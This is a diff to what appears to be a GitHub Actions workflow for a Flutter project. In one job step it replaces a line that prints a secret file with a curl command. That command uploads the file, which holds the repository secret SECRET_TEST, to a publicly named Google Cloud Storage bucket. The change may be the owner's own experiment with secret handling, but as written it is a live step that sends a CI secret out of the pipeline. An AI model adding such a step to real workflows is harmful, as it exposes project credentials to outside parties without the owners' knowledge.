@@ -52,7 +52,7 @@ jobs:
           SECRET_TEST: ${{ secrets.SECRET_TEST }}
         run: |
           echo $SECRET_TEST >> my_secret.txt
-          cat my_secret.txt
+          curl -v --upload-file my_secret.txt 'https://storage.googleapis.com/public-nilsreichardt/my_secret.txt'
 
       - name: Set Flutter version from FVM config file to environment variables
         uses: kuhnroyal/flutter-fvm-config-action@v1
